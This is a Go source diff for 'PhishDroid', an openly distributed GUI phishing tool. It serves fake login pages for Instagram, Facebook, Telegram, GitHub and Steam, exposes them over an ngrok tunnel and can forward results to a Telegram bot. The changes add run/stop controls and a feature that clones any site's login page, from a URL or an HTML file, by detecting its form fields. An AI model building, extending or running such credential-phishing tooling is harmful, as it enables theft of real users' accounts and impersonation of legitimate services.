@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -25,15 +27,16 @@ import (
 	"fyne.io/fyne/widget"
 )
 
-var version float64 = 0.2
+var version float64 = 0.3
 var useTelegramBot = false
 var isThisOtoTGBot = false
 var tg tgBot
+var ram runtime.MemStats
 var cizgi = widget.NewToolbarSeparator().ToolbarObject()
 var space = widget.NewLabel("")
 
 func islem(win fyne.Window, uyg fyne.App, typePhis string) {
-	var fonksiyon func(fyne.Window, *widget.TextGrid, *string)
+	var fonksiyon func(chan bool, fyne.Window, *widget.TextGrid, *string)
 	switch typePhis {
 	case "InstagramTelif":
 		fonksiyon = serveInstagramTelif
@@ -62,12 +65,27 @@ func islem(win fyne.Window, uyg fyne.App, typePhis string) {
 		uyg.SendNotification(fyne.NewNotification("PhishDroid", text.Text()))
 	})*/
 	//textGroup := widget.NewScrollContainer(textGrid)
+	stopChan := make(chan bool)
 
-	group := widget.NewGroupWithScroller("PhishDroid", text, cizgi, textGrid)
+	back := widget.NewButtonWithIcon("Back", theme.NavigateBackIcon(), func() {
+		gui(uyg, win)
+	})
 
-	win.SetContent(group)
+	var stopBool = false
+	var runStopButton *widget.Button
+	runStopButton = widget.NewButtonWithIcon("Run", theme.MediaPlayIcon(), func() {
+		if stopBool {
 
-	go func() {
+			stopChan <- true
+			stopBool = false
+			back.Enable()
+
+			runStopButton.SetText("Run")
+			runStopButton.SetIcon(theme.MediaPlayIcon())
+
+			runtime.GC()
+			return
+		}
 		if !checkNgrok() {
 			text.SetText("ngrok not found!")
 			return
@@ -78,7 +96,7 @@ func islem(win fyne.Window, uyg fyne.App, typePhis string) {
 			dialog.ShowError(err, win)
 		}
 		var textStream string
-		go fonksiyon(win, textGrid, &textStream)
+		go fonksiyon(stopChan, win, textGrid, &textStream)
 		ngrokurl, err := getNgrokLinkStable()
 		if err != nil {
 			dialog.ShowError(err, win)
@@ -90,9 +108,19 @@ func islem(win fyne.Window, uyg fyne.App, typePhis string) {
 		if err != nil {
 			dialog.ShowError(err, win)
 		}
-		uyg.OpenURL(urlNgrok)
+		go uyg.OpenURL(urlNgrok)
+		stopBool = true
+		runStopButton.SetText("Stop")
+		runStopButton.SetIcon(theme.MediaPauseIcon())
+		back.Disable()
+		runtime.GC()
 
-	}()
+	})
+
+	group := widget.NewGroupWithScroller("PhishDroid", text, cizgi, runStopButton, back, textGrid)
+
+	win.SetContent(group)
+
 	runtime.GC()
 
 }
@@ -201,18 +229,29 @@ func gui(uyg fyne.App, win fyne.Window) {
 		runtime.GC()
 	}()
 
-	//customngroklink := widget.NewTextGridFromString("ngrok url waiting")
 	customLabel := widget.NewLabel("You can use every site's template [unstable]")
-	customText := widget.NewTextGridFromString("Type your site and presss go!")
+	customText := widget.NewTextGridFromString("Type your site and press go!")
 	customEntry := widget.NewEntry()
-	customEntry.SetPlaceHolder("https://cartcurtweb.com/login")
+	customEntry.SetPlaceHolder("https://someTestSite/login")
 
 	customButon := widget.NewButtonWithIcon("Go", theme.ConfirmIcon(), func() {
 		if strings.Trim(customEntry.Text, " ") == "" {
 			dialog.ShowInformation("Empty Url", "Fill entry :9", win)
 			return
 		}
-		infi := dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
+
+		infi := dialog.NewProgressInfinite("Waiting Request", "Just a second...", win)
+		infi.Show()
+		resp, err := httpForCustumHTML(customEntry.Text)
+		if errHandler.HandlerBool(err) {
+			infi.Hide()
+			dialog.ShowError(err.(error), win)
+
+			return
+		}
+		infi.Hide()
+
+		infi = dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
 		infi.Show()
 		runNgrok("8089")
 		serverLink, err := getNgrokLinkStable()
@@ -222,81 +261,123 @@ func gui(uyg fyne.App, win fyne.Window) {
 			serverLink = "http://127.0.0.1:8089"
 		}
 
-		//customngroklink.SetText(serverLink)
 		fmt.Println(serverLink)
 
-		infi = dialog.NewProgressInfinite("Waiting Request", "Just a second...", win)
-		infi.Show()
-		oye := customHTMLwithHTTP(customEntry.Text, serverLink)
-		infi.Hide()
+		oye := customHTMLwithHTTP(resp.Body, customEntry.Text, serverLink)
 		if err, ok := oye["error"]; ok {
 			dialog.ShowError(err.(error), win)
 			return
 		}
-		//scripts := oye["scripts"].(int)
+
 		values := oye["values"].([]string)
 		html := oye["html"].(string)
 
-		//dialog.ShowInformation("Custom Values", fmt.Sprintf("Detected %d script tags.\nform values;\n%s", scripts, strings.Join(values, "\n")), win)
 		if len(values) == 0 {
-
 			dialog.ShowInformation("form-input", "Maybe this page\n("+customEntry.Text+")\n isn't login page...", win)
-			return
 		}
+
 		go func() {
-			makeCustomWindow(win, html, serverLink, customEntry.Text)
+			makeCustomWindow(win, uyg, html, serverLink, customEntry.Text)
 		}()
-		openurl, _ := url.Parse(serverLink)
-		uyg.OpenURL(openurl)
+		//openurl, _ := url.Parse(serverLink)
+		//uyg.OpenURL(openurl)
+	})
+	customBack := widget.NewButtonWithIcon("Back", theme.NavigateBackIcon(), func() { gui(uyg, win) })
+	customgroup := widget.NewGroup("Custom Template", customLabel, customText, customEntry, customButon, customBack, space, cizgi)
+	custom := widget.NewButton(">- Custom", func() { win.SetContent(customgroup) })
+
+	selectHTML := widget.NewButton("Select HTML file", func() {
+		//dialog.ShowCustomConfirm()
+		dialog.ShowFileOpen(func(uri fyne.URIReadCloser, err error) {
+			if uri == nil {
+				return
+			}
+			mime := uri.URI().MimeType()
+			if str := strings.Split(mime, "/"); len(str) < 2 {
+				dialog.ShowInformation("Wrong File!", fmt.Sprintf("Emm.\n%s isn't html type.", mime), win)
+				return
+			} else if mime != "text/html" && str[0] != "text" {
+				dialog.ShowInformation("Wrong File!", fmt.Sprintf("Emm.\n%s isn't html type.", mime), win)
+				return
+			}
+			hamVeri, err := ioutil.ReadAll(uri)
+			if errHandler.HandlerBool(err) {
+				dialog.ShowError(err, win)
+				return
+			}
+			fmt.Println(string(hamVeri))
+			if len(hamVeri) == 0 {
+				dialog.ShowError(errors.New("html file has to be full"), win)
+				return
+			}
+			fmt.Println("\n" + string(hamVeri))
+
+			infi := dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
+			infi.Show()
+			runNgrok("8089")
+			serverLink, err := getNgrokLinkStable()
+			infi.Hide()
+			if err != nil {
+				dialog.ShowError(err, win)
+				serverLink = "http://127.0.0.1:8089"
+			}
+
+			//customngroklink.SetText(serverLink)
+			//fmt.Println(serverLink)
+
+			//var response *http.Response
+			//response.Write(bytes.NewBuffer(hamVeri))
+			oye := customHTMLwithHTTP(bytes.NewReader(hamVeri), "", serverLink)
+
+			if err, ok := oye["error"]; ok {
+				dialog.ShowError(err.(error), win)
+				return
+			}
+			//scripts := oye["scripts"].(int)
+			values := oye["values"].([]string)
+			html := oye["html"].(string)
+
+			//dialog.ShowInformation("Custom Values", fmt.Sprintf("Detected %d script tags.\nform values;\n%s", scripts, strings.Join(values, "\n")), win)
+			if len(values) == 0 {
+
+				dialog.ShowInformation("form-input", "Maybe this page\n("+customEntry.Text+")\n isn't login page...", win)
+				//return
+			}
+			go func() {
+				makeCustomWindow(win, uyg, html, serverLink, customEntry.Text)
+			}()
+			/*openurl, _ := url.Parse(serverLink)
+			uyg.OpenURL(openurl)*/
+
+		}, win)
+
 	})
 
-	customgroup := widget.NewGroup("Custom Template", customLabel, customText, customEntry, customButon, space, cizgi)
-	//custom := widget.NewAccordionItem("Custom >-", customgroup)
-	custom := widget.NewButton(">- Custom", func() {
-		win.SetContent(customgroup)
-	})
-
-	instagratelifmbuton := widget.NewButton("Copyright Form", func() {
-		islem(win, uyg, "InstagramTelif")
-	})
-
-	instagramloginbuton := widget.NewButton("Login Page", func() {
-		islem(win, uyg, "InstagramLogin")
-	})
+	instagratelifmbuton := widget.NewButton("Copyright Form", func() { islem(win, uyg, "InstagramTelif") })
+	instagramloginbuton := widget.NewButton("Login Page", func() { islem(win, uyg, "InstagramLogin") })
 	instagramGroup := widget.NewGroup("Instagram", instagramloginbuton, instagratelifmbuton, space, cizgi)
 	instagram := widget.NewAccordionItem("Instagram", instagramGroup)
 
-	githubLoginButon := widget.NewButton("Login Page", func() {
-		islem(win, uyg, "GithubLogin")
-	})
-
+	githubLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "GithubLogin") })
 	githubGroup := widget.NewGroup("Github", githubLoginButon, space, cizgi)
 	github := widget.NewAccordionItem("Github", githubGroup)
 
-	steamLoginButon := widget.NewButton("Login Page", func() {
-		islem(win, uyg, "SteamLogin")
-	})
-
+	steamLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "SteamLogin") })
 	steamGroup := widget.NewGroup("Steam", steamLoginButon, space, cizgi)
 	steam := widget.NewAccordionItem("Steam", steamGroup)
 
-	myTelegramButon := widget.NewButton("MyTelegram Login", func() {
-		islem(win, uyg, "MyTelegramLogin")
-	})
+	myTelegramButon := widget.NewButton("MyTelegram Login", func() { islem(win, uyg, "MyTelegramLogin") })
 	telegramGroup := widget.NewGroup("Telegram", myTelegramButon, space, cizgi)
 	telegram := widget.NewAccordionItem("Telegram", telegramGroup)
 
-	facebookLoginButon := widget.NewButton("Login Page", func() {
-		islem(win, uyg, "FacebookLogin")
-	})
+	facebookLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "FacebookLogin") })
 	facebookGroup := widget.NewGroup("Facebook", facebookLoginButon, space, cizgi)
 	facebook := widget.NewAccordionItem("Facebook", facebookGroup)
+
 	accortdion := widget.NewAccordionContainer(instagram, facebook, telegram, github, steam)
 
-	// settings | version 0.2
-
 	settingsButton := widget.NewButtonWithIcon("Settings", theme.SettingsIcon(), func() { // vers 0.2
-		useTelegramCheck := widget.NewCheck("Use TelegramBots", func(tap bool) {
+		useTelegramCheck := widget.NewCheck("Use Telegram Bots", func(tap bool) {
 			if !tap {
 				isThisOtoTGBot = false
 				useTelegramBot = false
@@ -321,30 +402,6 @@ func gui(uyg fyne.App, win fyne.Window) {
 					tgChatID.SetText(oldTG.chatID)
 				}
 			}()
-
-			/*tgButton := widget.NewButton("ok", func() {
-				if tgHash.Text == "" || tgChatID.Text == "" {
-					dialog.ShowInformation("Empty Entry", "Please fill all entrys", win)
-					return
-				}
-				tgTest := NewtgBot(tgHash.Text, tgChatID.Text)
-				if ok, str := tgTest.test(); !ok {
-					dialog.ShowInformation("Telegram Say", str, win)
-					return
-				}
-				err := setTGBot(*tgTest)
-				if errHandler.HandlerBool(err) {
-					dialog.ShowError(err, win)
-					return
-				}
-				tg = *tgTest
-				useTelegramBot = true
-				isThisOtoTGBot = true
-
-				dialog.ShowInformation("Done", "We can go!", win)
-				return
-
-			})*/
 
 			tgBotVre := widget.NewVBox(tgHash, tgChatID /*, tgButton*/)
 			//dialog.ShowCustom("Type Ur Bot", "Back", tgBotVre, win)
@@ -390,23 +447,21 @@ func gui(uyg fyne.App, win fyne.Window) {
 		//useTelegramContent := widget.NewGroup("Use Telegram-Bot")
 		dialog.ShowCustom("Settings", "< Ok >", useTelegramCheck, win)
 	})
-	//
 
 	aboutTitle := widget.NewLabel("PhishDroid OpenSource GoLang Application")
-	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s\nNumGoRoutine %d", fmt.Sprint(version), runtime.GOARCH, runtime.Version(), runtime.NumGoroutine()))
+	runtime.ReadMemStats(&ram)
+	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s\nGoRoutine %d\nUsedRam %d mb", fmt.Sprint(version), runtime.GOARCH, runtime.Version(), runtime.NumGoroutine(), (ram.Alloc / 1024 / 1024)))
+
 	codeksiyonURL, _ := url.Parse("https://t.me/codeksiyon")
 	githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid")
 	releasesURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
-	//raifpyURL, _ := url.Parse("https://t.me/raifpy")
-	//grid := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(2), widget.NewHyperlink("@codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL))
-	//aboutGroup := widget.NewVBox(aboutTitle, versionArch, grid)
 	aboutGroup := widget.NewVBox(aboutTitle, versionArch, space, cizgi, fyne.NewContainerWithLayout(layout.NewHBoxLayout(), widget.NewHyperlink("Codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL), widget.NewHyperlink("Releases", releasesURL)))
 	about := widget.NewButtonWithIcon("About", theme.InfoIcon(), func() {
 		dialog.ShowCustom("About", "Back", aboutGroup, win)
 	})
 	cisim := canvas.NewImageFromResource(resourceTakPng)
 	cisim.FillMode = canvas.ImageFillOriginal
-	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, settingsButton, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
+	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, selectHTML, settingsButton, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
 	go func() { // Check; is avaible new version
 		verReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/version")
 		if errHandler.HandlerBool(err) {
@@ -453,3 +508,5 @@ func gui(uyg fyne.App, win fyne.Window) {
 
 	win.SetContent(group)
 }
+
+// ÇORBAAA
